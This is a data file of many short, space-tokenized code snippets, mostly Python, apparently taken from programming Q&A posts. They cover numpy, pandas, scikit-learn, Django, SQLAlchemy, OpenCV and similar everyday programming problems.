( len ( self._list ) , val )"
"pix = im.load ( ) print pix [ x , y ] pix [ x , y ] = value"
"def fast_solution ( A , B , m ) : n = len ( A ) sum_a = sum ( A ) sum_b = sum ( B ) d = sum_b - sum_a if d % 2 == 1 : return False d //= 2 count = counting ( A , m ) for i in xrange ( n ) : if 0 < = B [ i ] - d and B [ i ] - d < = m and count [ B [ i ] - d ] > 0 : return True return False"
"def save_item ( request , uname , data ) : `` '' '' Save a new item `` '' '' item = Item ( ) img = cStringIO.StringIO ( ) img.write ( base64.b64decode ( data ) ) myFile = File ( img ) item.preview.save ( 'fakename.jpg ' , myFile , save=False )"
"out = image > = np.tile ( mask , ( image.shape [ 0 ] , 100 , 100 ) ) np.greater_equal ( image , ( image.shape [ 0 ] , 100 , 100 ) , out=image ) mask = mask [ None , ... ] rows = np.tile ( np.arange ( mask.shape [ 1 ] , ( 100 , ) ) ) .reshape ( 1 , -1 , 1 ) cols = np.tile ( np.arange ( mask.shape [ 2 ] , ( 100 , ) ) ) .reshape ( 1 , 1 , -1 ) out = image > = mask [ : , rows , cols ] import numpy as npdef halftone_1 ( image , mask ) : return np.greater_equal ( image , np.tile ( mask , ( image.shape [ 0 ] , 100 , 100 ) ) ) def halftone_2 ( image , mask ) : mask = mask [ None , ... ] rows = np.tile ( np.arange ( mask.shape [ 1 ] ) , ( 100 , ) ) .reshape ( 1 , -1 , 1 ) cols = np.tile ( np.arange ( mask.shape [ 2 ] ) , ( 100 , ) ) .reshape ( 1 , 1 , -1 ) return np.greater_equal ( image , mask [ : , rows , cols ] ) rows , cols , planes = 6000 , 6000 , 3image = np.random.randint ( -2**31 , 2**31 - 1 , size= ( planes * rows * cols // 4 ) ) image = image.view ( dtype='uint8 ' ) .reshape ( planes , rows , cols ) mask = np.random.randint ( 256 , size= ( 1 , rows // 100 , cols // 100 ) ) .astype ( 'uint8 ' ) # np.all ( halftone_1 ( image , mask ) == halftone_2 ( image , mask ) ) # halftone_1 ( image , mask ) # halftone_2 ( image , mask ) import timeitprint timeit.timeit ( 'halftone_1 ( image , mask ) ' , 'from __main__ import halftone_1 , image , mask ' , number=1 ) print timeit.timeit ( 'halftone_2 ( image , mask ) ' , 'from __main__ import halftone_2 , image , mask ' , number=1 )"
"from Crypto.Cipher import AESobj = AES.new ( '0123456789012345 ' , AES.MODE_CBC , '0123456789012345 ' ) message = '0123456789012345'ciphertext = obj.encrypt ( message ) plaintext = obj.decrypt ( ciphertext ) # plaintext here is byte arrayobj2 = AES.new ( '0123456789012345 ' , AES.MODE_CBC , '0123456789012345 ' ) plaintext = obj2.decrypt ( ciphertext ) # plaintext here is 0123456789012345"
# See Dockerfile in github sourcepip install -- editable < from setup_cli.py >
"class C : def fit ( self , X , y=None ) : print ( 'fit ' ) return self def transform ( self , X ) : print ( 'transform ' ) return X def f ( self ) : print ( 'abc ' ) from sklearn.pipeline import Pipelineppl = Pipeline ( [ ( ' C ' , C ( ) ) ] )"
"from scipy.special import betafrom scipy.misc import combpdf = comb ( n , k ) * beta ( k + a , n - k + b ) / beta ( a , b ) def loglike_betabinom ( params , *args ) : `` '' '' Negative log likelihood function for betabinomial distribution : param params : list for parameters to be fitted . : param args : 2-element array containing the sample data . : return : negative log-likelihood to be minimized. `` '' '' a , b = params [ 0 ] , params [ 1 ] k = args [ 0 ] # the conversion rate n = args [ 1 ] # the number of at-bats ( AE ) pdf = comb ( n , k ) * beta ( k + a , n - k + b ) / beta ( a , b ) return -1 * np.log ( pdf ) .sum ( ) from scipy.optimize import minimize init_params = [ 1 , 10 ] res = minimize ( loglike_betabinom , x0=init_params , args= ( players [ ' H ' ] / players [ 'AB ' ] , players [ 'AB ' ] ) , bounds=bounds , method= ' L-BFGS-B ' , options= { 'disp ' : True , 'maxiter ' : 250 } ) print ( res.x ) ll < - function ( alpha , beta ) { x < - career_filtered $ H total < - career_filtered $ AB -sum ( VGAM : :dbetabinom.ab ( x , total , alpha , beta , log=True ) ) } m < - mle ( ll , start = list ( alpha = 1 , beta = 10 ) , method = `` L-BFGS-B '' , lower = c ( 0.0001 , 0.1 ) ) ab < - coef ( m )"
"app.add_route ( '/v1/my_route ' , MyResource ( ) ) app.add_route ( '/v1/my_route/ { app_id } ' , MyResource ( ) ) app.add_route ( '/v1/my_route2/any_route ' , AnyRouteResource ( ) ) app.add_route ( '/v1/my_route2/any_route/ { app_id } ' , AnyRouteResource ( ) ) class MyMiddleware ( object ) : def process_request ( self , req , resp ) : /** Here i want to get < app_id > value if it is passed **/"
"notanambiturner @ computer : ~/Dropbox/ $ $ P/ ... $ virtualenv -- no-site-packages venvNew python executable in venv/bin/pythonInstalling setuptools , pip , wheel ... done . notanambiturner @ computer : ~/Dropbox/ $ $ P/ ... $ source venv/bin/activate ( venv ) notanambiturner @ computer : ~/Dropbox/ $ $ P/ ... $ ( venv ) notanambiturner @ computer : ~/Dropbox/ $ $ P/ ... $ pip freezeadium-theme-ubuntu==0.3.4apt-xapian-index==0.46beautifulsoup4==4.4.1bleach==1.4.2blinker==1.3cffi==1.1.2characteristic==14.3.0chardet==2.3.0colorama==0.3.3command-not-found==0.3 ... .virtualenv==13.1.2virtualenv-clone==0.2.6virtualenvwrapper==4.7.1wheel==0.26.0whitenoise==1.0.6xdiagnose==3.8.1zope.interface==4.1.2 ( venv ) notanambiturner @ computer : ~/Dropbox/ $ $ P/ ... $ ( venv ) notanambiturner @ computer : ~/Dropbox/ $ $ P/ ... $ pythonPython 2.7.10 ( default , Oct 14 2015 , 16:09:02 ) [ GCC 5.2.1 20151010 ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import sys > > > sys.path [ `` , '/usr/lib/python2.7 ' , '/usr/lib/python2.7/plat-x86_64-linux-gnu ' , '/usr/lib/python2.7/lib-tk ' , '/usr/lib/python2.7/lib-old ' , '/usr/lib/python2.7/lib-dynload ' , '/home/notanambiturner/.local/lib/python2.7/site-packages ' , '/usr/local/lib/python2.7/dist-packages ' , '/usr/lib/python2.7/dist-packages ' , '/usr/lib/python2.7/dist-packages/PILcompat ' , '/usr/lib/python2.7/dist-packages/gtk-2.0 ' , '/usr/lib/python2.7/dist-packages/ubuntu-sso-client ' ] > > > ( venv ) notanambiturner @ computer : ~/Dropbox/ $ $ P/ ... $ python3Python 3.4.3+ ( default , Oct 14 2015 , 16:03:50 ) [ GCC 5.2.1 20151010 ] on linuxType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import sys > > > sys.path [ `` , '/usr/lib/python3.4 ' , '/usr/lib/python3.4/plat-x86_64-linux-gnu ' , '/usr/lib/python3.4/lib-dynload ' , '/usr/local/lib/python3.4/dist-packages ' , '/usr/lib/python3/dist-packages ' ] > > > notanambiturner @ computer : ~ $ source venv/bin/activate ( venv ) notanambiturner @ computer : ~ $ pip freezewheel==0.24.0 ( venv ) notanambiturner @ computer : ~ $ pythonPython 2.7.10 ( default , Oct 14 2015 , 16:09:02 ) [ GCC 5.2.1 20151010 ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import sys > > > sys.path [ `` , '/home/notanambiturner/venv/lib/python2.7 ' , '/home/notanambiturner/venv/lib/python2.7/plat-x86_64-linux-gnu ' , '/home/notanambiturner/venv/lib/python2.7/lib-tk ' , '/home/notanambiturner/venv/lib/python2.7/lib-old ' , '/home/notanambiturner/venv/lib/python2.7/lib-dynload ' , '/usr/lib/python2.7 ' , '/usr/lib/python2.7/plat-x86_64-linux-gnu ' , '/usr/lib/python2.7/lib-tk ' , '/home/notanambiturner/venv/local/lib/python2.7/site-packages ' , '/home/notanambiturner/venv/lib/python2.7/site-packages ' ] > > >"
"from sklearn.feature_extraction.text import TfidfVectorizerfrom sklearn.compose import ColumnTransformerdataset = pd.DataFrame ( { `` a '' : [ `` word gone wild '' , '' gone with wind '' ] , '' c '' : [ 1,2 ] } ) tfidf = TfidfVectorizer ( min_df=0 ) clmn = ColumnTransformer ( [ ( `` tfidf '' , tfidf , [ `` a '' ] ) ] , remainder= '' passthrough '' ) clmn.fit_transform ( dataset ) ValueError : empty vocabulary ; perhaps the documents only contain stop words tfidf.fit_transform ( dataset.a ) < 2x5 sparse matrix of type ' < class 'numpy.float64 ' > ' with 6 stored elements in Compressed Sparse Row format >"
"if self._variant == 'propagation ' : normalizer = np.sum ( self.label_distributions_ , axis=1 ) [ : , np.newaxis ] self.label_distributions_ /= normalizer self.label_distributions_ = safe_sparse_dot ( graph_matrix , self.label_distributions_ ) > > > np.exp ( np.asarray ( -10*40 , dtype=float ) ) # gamma = 40 = > OKAY1.9151695967140057e-174 > > > np.exp ( np.asarray ( -10*120 , dtype=float ) ) # gamma = 120 = > NOT OKAY0.0 In [ 11 ] : from sklearn.semi_supervised.label_propagation import LabelPropagationIn [ 12 ] : import numpy as npIn [ 13 ] : X = np.array ( [ [ 0 , 0 ] , [ 0 , 10 ] ] ) In [ 14 ] : Y = [ 0 , -1 ] In [ 15 ] : LabelPropagation ( kernel='rbf ' , tol=0.01 , gamma=20 ) .fit ( X , Y ) /usr/local/lib/python3.5/dist-packages/sklearn/semi_supervised/label_propagation.py:279 : RuntimeWarning : invalid value encountered in true_divide self.label_distributions_ /= normalizer/usr/local/lib/python3.5/dist-packages/sklearn/semi_supervised/label_propagation.py:290 : ConvergenceWarning : max_iter=1000 was reached without convergence . category=ConvergenceWarningOut [ 15 ] : LabelPropagation ( alpha=None , gamma=20 , kernel='rbf ' , max_iter=1000 , n_jobs=1 , n_neighbors=7 , tol=0.01 ) In [ 16 ] : LabelPropagation ( kernel='rbf ' , tol=0.01 , gamma=2 ) .fit ( X , Y ) Out [ 16 ] : LabelPropagation ( alpha=None , gamma=2 , kernel='rbf ' , max_iter=1000 , n_jobs=1 , n_neighbors=7 , tol=0.01 ) In [ 17 ] :"
"( 'Barack ' , ' 5 ' , 'nsubj : pass ' ) ( 'Obama ' , ' 1 ' , 'flat ' ) ( 'was ' , ' 5 ' , 'aux : pass ' ) ( 'not ' , ' 5 ' , 'advmod ' ) ( 'born ' , ' 0 ' , 'root ' ) ( 'in ' , ' 7 ' , 'case ' ) ( 'Hawaii ' , ' 5 ' , 'obl ' ) import stanfordnlpstanfordnlp.download ( 'en ' ) nlp = stanfordnlp.Pipeline ( ) doc = nlp ( `` Barack Obama was not born in Hawaii '' ) a = doc.sentences [ 0 ] a.print_dependencies ( )"
"import rehReg = re.compile ( `` /robert/ ( ? P < action > ( [ a-zA-Z0-9 ] * ) ) / $ '' ) hMatch = hReg.match ( `` /robert/delete/ '' ) args = hMatch.groupdict ( ) def reverse ( pattern , dictArgs ) :"
"@ specialclassclass Thing ( object ) : @ specialFunc def method1 ( arg1 , arg2 ) : ... @ specialFunc def method2 ( arg3 , arg4 , arg5 ) : ... load/compile .py filestransform using decorators// maybe transform a few more times using decoratorsexecute code // no more transformations ! load/parse application files load/compile transformertransform application files using transformercompileexecute code cacheDict = { } def cache ( func ) : @ functools.wraps ( func ) def wrapped ( *args , **kwargs ) : cachekey = hash ( ( args , kwargs ) ) if cachekey not in cacheDict.keys ( ) : cacheDict [ cachekey ] = func ( *args , **kwargs ) return cacheDict [ cachekey ] return wrapped @ cachedef expensivepurefunction ( arg1 , arg2 ) : # do stuff return result public Thingy wrap ( Object O ) { //this probably wo n't compile , but you get the idea return ( params Object [ ] args ) = > { //check cache return InvokeWithReflection ( O , args ) } }"
"> > > import datetime > > > import pytz > > > from apps.myapp.models import Project > > > input_date = timezone.now ( ) > > > input_datedatetime.datetime ( 2017 , 2 , 7 , 16 , 7 , 14 , 377429 , tzinfo= < UTC > ) > > > current_tz = pytz.timezone ( 'America/New_York ' ) > > > current_tz < DstTzInfo 'America/New_York ' LMT-1 day , 19:04:00 STD > > > > input_date = input_date.replace ( tzinfo=current_tz ) > > > input_datedatetime.datetime ( 2017 , 2 , 7 , 16 , 7 , 14 , 377429 , tzinfo= < DstTzInfo 'America/New_York ' LMT-1 day , 19:04:00 STD > ) > > > project = Project.objects.get ( pk=1 ) > > > project.launch_datedatetime.datetime ( 2017 , 1 , 14 , 8 , 53 , 57 , 241718 , tzinfo= < UTC > ) > > > project.launch_date = input_date > > > project.launch_datedatetime.datetime ( 2017 , 2 , 7 , 16 , 7 , 14 , 377429 , tzinfo= < DstTzInfo 'America/New_York ' LMT-1 day , 19:04:00 STD > ) > > > project.save ( ) > > > project.refresh_from_db ( ) > > > project.launch_datedatetime.datetime ( 2017 , 2 , 7 , 21 , 3 , 14 , 377429 , tzinfo= < UTC > ) > > > project.launch_date.astimezone ( current_tz ) datetime.datetime ( 2017 , 2 , 7 , 16 , 3 , 14 , 377429 , tzinfo= < DstTzInfo 'America/New_York ' EST-1 day , 19:00:00 STD > ) > > > input_datedatetime.datetime ( 2017 , 2 , 7 , 16 , 7 , 14 , 377429 , tzinfo= < DstTzInfo 'America/New_York ' LMT-1 day , 19:04:00 STD > )"
import timeimport multiprocessingdef process ( ) : # : FIXME time.sleep ( 3 ) returndef main ( ) : pool = multiprocessing.Pool ( processes=10 ) while 1 : pool.apply_async ( process ) pool.close ( ) pool.join ( ) if __name__ == '__main__ ' : main ( )
"# models.pyclass Post ( db.Model ) : __tablename__ = 'posts ' id = db.Column ( db.Integer , primary_key=True ) location = db.Column ( Geography ( geometry_type='POINT ' , srid=4326 ) ) # routes.pyfrom models import Post @ app.route ( '/get_coordinates ' ) lat = request.args.get ( 'lat ' , None ) lng = request.args.get ( 'lng ' , None ) if lat and lng : point = WKTElement ( 'POINT ( { 0 } { 1 } ) '.format ( lng , lat ) , srid=4326 ) # Here i should make the query to get all Posts that are near the Point"
"python = sys.executableos.execl ( python , python , * sys.argv ) Traceback ( most recent call last ) : File `` /usr/lib/python2.7/site.py '' , line 68 , in < module > import osFile `` /usr/lib/python2.7/os.py '' , line 49 , in < module > import posixpath as pathFile `` /usr/lib/python2.7/posixpath.py '' , line 17 , in < module > import warningsFile `` /usr/lib/python2.7/warnings.py '' , line 6 , in < module > import linecacheImportError : No module named linecache Traceback ( most recent call last ) : File `` /usr/lib/python2.7/site.py '' , line 68 , in < module > import os File `` /usr/lib/python2.7/os.py '' , line 49 , in < module > import posixpath as path File `` /usr/lib/python2.7/posixpath.py '' , line 15 , in < module > import stat ImportError : No module named stat Traceback ( most recent call last ) : File `` /usr/lib/python2.7/site.py '' , line 68 , in < module > import osFile `` /usr/lib/python2.7/os.py '' , line 49 , in < module > import posixpath as pathImportError : No module named posixpath"
"from sqlalchemy import Column , Integer , Enum , ForeignKeyfrom sqlalchemy.orm import relationshipfrom sqlalchemy.ext.associationproxy import association_proxyfrom sqlalchemy.ext.declarative import declarative_baseBase = declarative_base ( ) class MyBaseClass ( object ) : `` '' '' Base class for all publicly accessible classes '' '' '' id = Column ( Integer , primary_key=True ) class Person ( MyBaseClass ) : `` '' '' A Person '' '' '' name = Column ( Unicode ) movies = association_proxy ( 'movie_roles ' , 'movie ' , creator=lambda m : _PersonMovieRole ( movie=m ) ) shows = association_proxy ( 'show_roles ' , 'show ' , creator=lambda s : _PersonShowRole ( show=s= ) ) class _PersonMovieRole ( Base ) : `` '' '' Role for a Person in a Movie '' '' '' __tablename__ = 'persons_movies ' id = Column ( Integer , primary_key=True ) role = Column ( Enum ( 'none ' , 'actor ' , 'writer ' , 'director ' , 'producer ' ) , default='none ' ) person_id = Column ( Integer , ForeignKey ( 'persons.id ' ) ) person = relationship ( 'Person ' , backref='movie_roles ' ) movie_id = Column ( Integer , ForeignKey ( 'movies.id ' ) ) movie = relationship ( 'Movie ' , backref='persons_roles ' ) class _PersonShowRole ( Base ) : `` '' '' Role for a Person in a Show '' '' '' __tablename__ = 'persons_shows ' id = Column ( Integer , primary_key=True ) role = Column ( Enum ( 'none ' , 'actor ' , 'writer ' , 'director ' , 'producer ' ) , default='none ' ) person_id = Column ( Integer , ForeignKey ( 'persons.id ' ) ) person = relationship ( 'Person ' , backref='show_roles ' ) show_id = Column ( Integer , ForeignKey ( 'shows.id ' ) ) show = relationship ( 'Episode ' , backref='persons_roles ' ) class MetadataMixin ( object ) : `` '' '' Mixin class that provides metadata-fields and methods '' '' '' # ... persons = association_proxy ( 'persons_roles ' , 'person ' , creator= # ... ? ? ? ... # ) class Movie ( Base , MyBaseClass , MetadataMixin ) : # ... . pass"
"import randomclass PrimaryReplicaRouter ( object ) : def db_for_read ( self , model , **hints ) : `` '' '' Reads go to a randomly-chosen replica. `` '' '' return random.choice ( [ 'replica1 ' , 'replica2 ' ] ) def db_for_write ( self , model , **hints ) : `` '' '' Writes always go to primary. `` '' '' return 'primary ' def allow_relation ( self , obj1 , obj2 , **hints ) : `` '' '' Relations between objects are allowed if both objects are in the primary/replica pool. `` '' '' db_list = ( 'primary ' , 'replica1 ' , 'replica2 ' ) if obj1._state.db in db_list and obj2._state.db in db_list : return True return None def allow_migrate ( self , db , app_label , model_name=None , **hints ) : `` '' '' All non-auth models end up in this pool. `` '' '' return True"
"import java.util . * ; public class sortDemo implements Comparator < String > { public static void main ( String [ ] args ) { ArrayList < String > animals = new ArrayList < String > ( ) ; animals.add ( `` ant '' ) ; animals.add ( `` antelope '' ) ; animals.add ( `` zebra '' ) ; animals.add ( `` anteater '' ) ; for ( String a : animals ) { System.out.println ( a ) ; } System.out.println ( ) ; // want output to be anteater , antelope , ant , zebra following the sort Collections.sort ( animals , new sortDemo ( ) ) ; for ( String a : animals ) { System.out.println ( a ) ; } } public int compare ( String s1 , String s2 ) { if ( s1.charAt ( 0 ) > s2.charAt ( 0 ) ) { return 1 ; } else if ( s1.charAt ( 0 ) == s2.charAt ( 0 ) ) { if ( s1.length ( ) < s2.length ( ) ) { return 1 ; } else if ( s1.length ( ) == s2.length ( ) ) { return s1.compareTo ( s2 ) ; } else { return -1 ; } } else { return -1 ; } } }"
from gi.repository import Giotry : settings = Gio.Settings ( `` com.example.doesnotexist '' ) except : print `` Could n't load those settings ! ''
"import numpyimport scipy.speciali = numpy.linspace ( 0 , 500 , 501 , dtype = int ) def func ( x , n ) : return scipy.special.eval_hermite ( n , x ) hermites = func ( 0 , i ) hermites = [ func ( 0 , idx ) for idx in i ]"
"result = [ 0 , 0 , 0 ] # reverse projected point , in homogeneous coord.while 1 : _ , img = cap.read ( ) if flag : # If the user has clicked somewhere result = np.dot ( np.linalg.inv ( mtx ) , [ mouse_x , mouse_y , 1 ] ) result = np.arctan ( result ) # convert to angle flag = False cv2.putText ( img , ' ( { } , { } ) '.format ( mouse_x , mouse_y ) , ( 20 , 440 ) , cv2.FONT_HERSHEY_SIMPLEX , 0.5 , ( 0 , 255 , 0 ) , 2 , cv2.LINE_AA ) cv2.putText ( img , ' ( { : .2f } , { : .2f } ) '.format ( 180/np.pi*result [ 0 ] , 180/np.pi*result [ 1 ] ) , ( 20 , 460 ) , cv2.FONT_HERSHEY_SIMPLEX , 0.5 , ( 0 , 255 , 0 ) , 2 , cv2.LINE_AA ) cv2.imshow ( 'image ' , img ) if cv2.waitKey ( 1 ) & 0xFF == ord ( ' q ' ) : break nCalFrames = 12 # number of frames for calibrationnFrames = 0criteria = ( cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER , 30 , 0.001 ) # termination criteriaobjp = np.zeros ( ( 9*7 , 3 ) , np.float32 ) objp [ : , :2 ] = np.mgrid [ 0:9 , 0:7 ] .T.reshape ( -1 , 2 ) objpoints = [ ] # 3d point in real world spaceimgpoints = [ ] # 2d points in image plane.cap = cv2.VideoCapture ( 0 ) previousTime = 0gray = 0while 1 : # Capture frame-by-frame _ , img = cap.read ( ) gray = cv2.cvtColor ( img , cv2.COLOR_BGR2GRAY ) # Find the chess board corners ret , corners = cv2.findChessboardCorners ( gray , ( 9 , 7 ) , None ) # If found , add object points , image points ( after refining them ) if ret : corners2 = cv2.cornerSubPix ( gray , corners , ( 11 , 11 ) , ( -1 , -1 ) , criteria ) if time.time ( ) - previousTime > 2 : previousTime = time.time ( ) imgpoints.append ( corners2 ) objpoints.append ( objp ) img = cv2.bitwise_not ( img ) nFrames = nFrames + 1 # Draw and display the corners img = cv2.drawChessboardCorners ( img , ( 9 , 7 ) , corners , ret ) cv2.putText ( img , ' { } / { } '.format ( nFrames , nCalFrames ) , ( 20 , 460 ) , cv2.FONT_HERSHEY_SIMPLEX , 2 , ( 0 , 255 , 0 ) , 2 , cv2.LINE_AA ) cv2.putText ( img , 'press \ ' q\ ' to exit ... ' , ( 255 , 15 ) , cv2.FONT_HERSHEY_SIMPLEX , 0.5 , ( 0 , 0 , 255 ) , 1 , cv2.LINE_AA ) # Display the resulting frame cv2.imshow ( 'Webcam Calibration ' , img ) if nFrames == nCalFrames : break if cv2.waitKey ( 1 ) & 0xFF == ord ( ' q ' ) : breakRMS_error , mtx , disto_coef , _ , _ = cv2.calibrateCamera ( objpoints , imgpoints , gray.shape [ : :-1 ] , None , None )"
"[ 10,12,8,13,7,18,19,9,15,14 ] # data used for example , in real its a 50k lines df pd.DataFrame ( { 'value ' : [ 10 , 12 , 8 , 13 , 7 , 18 , 19 , 9 , 15 , 14 ] , 'window_of_last_5_values ' : [ np.NaN , np.NaN , np.NaN , np.NaN , '10,12,8,13,7 ' , '12,8,13,7,18 ' , ' 8,13,7,18,19 ' , '13,7,18,19,9 ' , ' 7,18,19,9,15 ' , '18,19,9,15,14 ' ] , 'values that are counting for average ' : [ np.NaN , np.NaN , np.NaN , np.NaN , '10,12,8 ' , '12,8,13 ' , ' 8,13,18 ' , '13,18,9 ' , '18,9,15 ' , '18,15,14 ' ] , 'result ' : [ np.NaN , np.NaN , np.NaN , np.NaN , 10.0 , 11.0 , 13.0 , 13.333333333333334 , 14.0 , 15.666666666666666 ] } ) window_size = 5outliers_to_remove = 1for index in range ( window_size - 1 , len ( df ) ) : current_window = df.iloc [ index - window_size + 1 : index + 1 ] trimmed_mean = current_window.sort_values ( 'value ' ) [ outliers_to_remove : window_size - outliers_to_remove ] [ 'value ' ] .mean ( ) # save the result and the window content somewhere"
> > > def f1 ( x ) : x*100 > > > dis.dis ( f1 ) 2 0 LOAD_FAST 0 ( x ) 3 LOAD_CONST 1 ( 100 ) 6 BINARY_MULTIPLY 7 POP_TOP 8 LOAD_CONST 0 ( None ) 11 RETURN_VALUE > > > def f2 ( x ) : x*10*10 > > > dis.dis ( f2 ) 2 0 LOAD_FAST 0 ( x ) 3 LOAD_CONST 1 ( 10 ) 6 BINARY_MULTIPLY 7 LOAD_CONST 1 ( 10 ) 10 BINARY_MULTIPLY 11 POP_TOP 12 LOAD_CONST 0 ( None ) 15 RETURN_VALUE
"from graphics import *def regression ( ) : # creating the window for the regression line win = GraphWin ( `` Regression Line - Start Clicking ! `` , 500 , 500 ) win.setCoords ( 0.0 , 0.0 , 10.0 , 10.0 ) rect = Rectangle ( Point ( 0.5 , 0.1 ) , Point ( 2.5 , 2.1 ) ) rect.setFill ( `` red '' ) rect.draw ( win ) Text ( rect.getCenter ( ) , `` Done '' ) .draw ( win ) message = Text ( Point ( 5 , 0.5 ) , `` Click in this screen '' ) message.draw ( win ) points = [ ] # list of points n = 0 # count variable sumX = 0 sumY = 0 while True : p = win.getMouse ( ) p.draw ( win ) # if user clicks in a red square it exits the loop and calculates the regression line if ( p.getX ( ) > = 0.5 and p.getX ( ) < = 2.5 ) and ( p.getY ( ) > = 0.1 and p.getY ( ) < = 2.1 ) : break n += 1 # count of the points # get the sum of the X and Y points sumX = sumX + p.getX ( ) sumY = sumY + p.getY ( ) # tuple of the X and Y points dot = ( p.getX ( ) , p.getY ( ) ) points.append ( dot ) avgX = sumX / n avgY = sumY / n top = 0 bottom = 0 # my ugly attempt at the regression equation shown in the book for i in points : gp = 0 numer = points [ gp ] [ 0 ] * points [ gp ] [ 1 ] top = top + numer denom = points [ gp ] [ 0 ] ** 2 bottom = bottom + denom gp += 1 m = ( top - sumX * sumY ) / ( bottom - sumX ** 2 ) y1 = avgY + m * ( 0.0 - avgX ) y2 = avgY + m * ( 10.0 - avgX ) regressionline = Line ( Point ( 0 , y1 ) , Point ( 10.0 , y2 ) ) regressionline.draw ( win ) raw_input ( `` Press < Enter > to quit . '' ) win.close ( ) regression ( )"
"message = Message ( ) message.body = u '' hello body '' data = Data ( ) data.put_map ( ) data.enter ( ) data.put_string ( `` key '' ) data.put_string ( `` value '' ) data.exit ( ) message.properties = data messenger.put ( message ) messenger.send ( ) Traceback ( most recent call last ) : File `` ./candy_ingest.py '' , line 37 , in < module > messenger.put ( message ) File `` /usr/lib/python2.7/dist-packages/proton.py '' , line 473 , in put message._pre_encode ( ) File `` /usr/lib/python2.7/dist-packages/proton.py '' , line 781 , in _pre_encode props.put_object ( self.properties ) File `` /usr/lib/python2.7/dist-packages/proton.py '' , line 2036 , in put_object putter = self.put_mappings [ obj.__class__ ] KeyError : < class proton.Data at 0x2320420 >"
"class memoize ( object ) : def __init__ ( self , cls ) : if type ( cls ) is FunctionType : # Let 's just pretend that the function you gave us is a class . cls.instances = { } cls.__init__ = cls self.cls = cls self.__dict__.update ( cls.__dict__ ) def __call__ ( self , *args , **kwargs ) : `` '' '' Return a cached instance of the appropriate class if it exists . '' '' '' # This is some dark magic we 're using here , but it 's how we discover # that the first argument to Photograph.__init__ is 'filename ' , but the # first argument to Camera.__init__ is 'camera_id ' in a general way . delta = 2 if type ( self.cls ) is FunctionType else 1 first_keyword_arg = [ k for k , v in inspect.getcallargs ( self.cls.__init__ , 'self ' , 'first argument ' , * [ 'subsequent args ' ] * ( len ( args ) + len ( kwargs ) - delta ) ) .items ( ) if v == 'first argument ' ] [ 0 ] key = kwargs.get ( first_keyword_arg ) or args [ 0 ] print key if key not in self.cls.instances : self.cls.instances [ key ] = self.cls ( *args , **kwargs ) return self.cls.instances [ key ] @ memoizeclass FooBar : instances = { } def __init__ ( self , unique_id , irrelevant=None ) : print id ( self ) def __call__ ( self , *args , **kwargs ) : key = inspect.getcallargsaslist ( self.cls.__init__ , None , *args , **kwargs ) [ 1 ] if key not in self.cls.instances : self.cls.instances [ key ] = self.cls ( *args , **kwargs ) return self.cls.instances [ key ]"
"class MyRouter ( object ) : # ... def allow_migrate ( self , db , app_label , model_name=None , **hints ) : if app_label == 'my_app ' : return db == 'remote ' return None python manage.py migrate my_app -- database=remote python manage.py runserver"
"import pandas as pdimport numpy as npdf = pd.DataFrame ( { `` first_column '' : [ 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 ] } ) > > > df first_column0 01 02 03 14 15 16 07 08 19 110 011 012 013 014 115 116 117 118 119 020 0 > > > df first_column counts0 0 01 0 02 0 03 1 34 1 35 1 36 0 07 0 08 1 29 1 210 0 011 0 012 0 013 0 014 1 515 1 516 1 517 1 518 1 519 0 020 0 0"
python -c `` for i in range ( 10 ) : print ( n ) '' python -c `` n = 1 ; n = 2 ; print ( n ) ''
"def logged_in ( fn ) : def decorator ( ) : if 'email ' in session : return fn ( ) else : return render_template ( 'not-allowed.html ' , page= '' index '' ) return decorator @ app.route ( '/ ' ) @ logged_indef index ( ) : email = session [ 'email ' ] return render_template ( 'index.html ' , auth=True , page= '' index '' , marks=marks ) @ app.route ( '/sign-out ' ) def sign_out ( ) : session.pop ( 'email ' ) print ( url_for ( 'index ' ) ) return redirect ( url_for ( 'index ' ) )"
from pyparsing import *A = Word ( nums ) .setResultsName ( ' A ' ) B = Word ( alphas ) .setResultsName ( ' B ' ) expr = OneOrMore ( A | B ) result = expr.parseString ( `` 123 abc 456 7 d '' ) print result for elem in result : if elem.is_of_type ( ' A ' ) : # do stuff elif elem.is_of_type ( ' B ' ) : # do something else
Action 1891Adult 9Adventure 1313Animation 314Biography 394Comedy 3922Crime 1867Drama 5697Family 754Fantasy 916Film-Noir 40History 358Horror 1215Music 371Musical 260Mystery 1009News 1Reality-TV 1Romance 2441Sci-Fi 897Sport 288Thriller 2832War 512Western 235dtype : int64 genre_count = np.sort ( data [ genres ] .sum ( ) ) [ : :-1 ] pd.DataFrame ( { 'Genre Count ' : genre_count } ) ` ` Out [ 19 ] : Genre Count0 56971 39222 28323 24414 18915 18676 13137 12158 10099 91610 89711 75412 51213 39414 37115 35816 31417 28818 26019 23520 4021 922 123 1 Genre CountDrama 5697Comedy 3922Thriller 2832Romance 2441Action 1891Crime 1867Adventure 1313Horror 1215Mystery 1009Fantasy 916Sci-Fi 897Family 754War 512Biography 394Music 371History 358Animation 314Sport 288Musical 260Western 235Film-Noir 40Adult 9News 1Reality-TV 1
'2015-01-01 ' : 1'2015-01-02 ' : 3'2015-01-03 ' : 7'2015-01-04 ' : 8 '2015-01-01 ' : 0 '2015-01-02 ' : 2'2015-01-03 ' : 4'2015-01-04 ' : 1
"class Thing ( db.Model ) : owner = db.ReferenceProperty ( reference_class=User , required=True ) owner_id = db.StringProperty ( required=True ) ... class User ( db.Model ) : id = db.StringProperty ( required=True ) ... # get all Thing instances that belong to friendsquery = Thing.all ( ) query.filter ( 'owner_id IN ' , friend_ids )"
"data = [ 3 , 7 , 4 , 0 , 1 , 3 , 7 ] slices = [ [ 3 , 7 , 4 ] , [ 1 , 3 , 7 ] ]"
Name first_seen last_seen 0 Random guy 1 5/22/2016 18:12 5/22/2016 18:15 1 Random guy 2 5/22/2016 12:03 5/22/2016 12:03 2 Random guy 3 5/22/2016 21:06 5/22/2016 21:06 3 Random guy 4 5/22/2016 16:20 5/22/2016 16:20 4 Random guy 5 5/22/2016 14:46 5/22/2016 14:46 - morning : 08:00 to 12:00 hrs - afternoon : 12:00 to 16:00 hrs - evening : 16:00 to 20:00 hrs - night : 20:00 to 24:00 hrs visit_period evening afternoon night evening afternoon
